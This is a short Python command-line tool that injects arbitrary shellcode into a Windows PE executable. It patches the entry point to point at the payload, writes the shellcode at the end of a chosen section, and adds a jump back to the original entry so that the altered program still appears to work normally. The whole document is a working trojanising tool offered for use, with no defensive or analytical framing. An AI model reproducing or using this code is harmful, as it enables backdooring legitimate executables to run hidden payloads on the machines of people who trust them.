#!C:\Program Files (x86)\Python37
# pip install pefile

import argparse, sys

def getval(start, size):
	global bin
	x = 0
	for i in range(0, size):
		x += bin[start + i] << (i * 8)
	return x

def setval(value, size):
	global bin	
	if value < 0:
		value = int("FF" * size, 16) - (abs(value) - 1)	
	return value.to_bytes(size, "little")
	
def shellcode(value):
	bb = []
	for i in range(0, len(value), 4):
		bb.append( int(value[i+2:i+4], 16) )
	bs = b""
	for x in bb:
		bs += x.to_bytes(1, "big")
	return bs

parser = argparse.ArgumentParser()
parser.add_argument("inputfile", help="Input executable for inject", type=str)
parser.add_argument("outputfile", help="Output executable injected", type=str)
parser.add_argument("shellcode", help="Shellcode for inject in the executable, in the format: '\\x00\\x00\\x00\\x00' ...", type=str)
parser.add_argument("-s", "--section", help="Section to inject into. Default is '.text'", default=".text", type=str)
args = parser.parse_args()

iexe = open(args.inputfile, "rb")                        
bin  = iexe.read()
iexe.close()

dt = bin.find( args.section.encode() )
if dt == -1:
	print("Section '%s' not found." % args.section)
	sys.exit(1)

peh = getval(0x3C, 4)                                       # PE Header

if bin[peh:peh+2] != b"PE":
	print("This file is not a valid executable.")
	sys.exit(2)

entry    = getval(peh+0x28, 4)                              # Entry point
vsize    = getval(dt+0x8, 4)                                # Virtual size
vaddress = getval(dt+0xC, 4)                                # Virtual address
raddress = getval(dt+0x14, 4)                               # Raw address

csize = vsize - (entry - vaddress)

code = shellcode( args.shellcode )
oexe = open(args.outputfile, "wb")                     

oexe.write(bin[0:peh+0x28])                                 # Writing the initial bytes
oexe.write( setval(vaddress + vsize, 4) )                   # Entry point
oexe.write(bin[peh+0x2C:dt+0x8])                            # Writing bytes before virtual size
oexe.write( setval(vsize + len(code) + 5, 4) )              # Virtual size
oexe.write(bin[dt+0xC:raddress + vsize])                    # Writing bytes before shellcode
oexe.write(code)                                            # Writing the shellcode
oexe.write(b"\xE9" + setval(-(csize + len(code) + 5), 4))   # Jump for the original entry point

oexe.write(bin[raddress + vsize + len(code) + 5:])          # Writing the end of the file

oexe.close()

